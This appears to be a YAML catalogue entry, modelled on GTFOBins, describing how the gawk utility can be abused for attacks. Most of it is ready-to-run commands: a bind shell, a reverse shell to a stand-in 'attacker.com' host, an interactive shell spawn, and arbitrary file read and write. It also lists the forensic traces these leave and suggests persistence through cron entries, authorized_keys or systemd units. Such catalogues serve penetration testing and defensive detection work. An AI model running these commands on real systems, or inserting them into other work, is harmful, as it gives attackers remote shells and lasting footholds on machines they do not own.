---
name: gawk
capabilities:
- exec
- spawn
- read
- write
- bind
- reverse-shell
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: bind-shell
  description: Open a bind shell on a listening port.
  capabilities:
  - bind
  - exec
  command: |-
    gawk 'BEGIN {
        s = "/inet/tcp/12345/0/0";
        while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
        while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: gawk '//' /path/to/input-file
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: |-
    gawk 'BEGIN {
        s = "/inet/tcp/0/attacker.com/12345";
        while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
        while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: gawk 'BEGIN {system("/bin/sh")}'
references:
- https://gtfobins.github.io/gtfobins/gawk/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
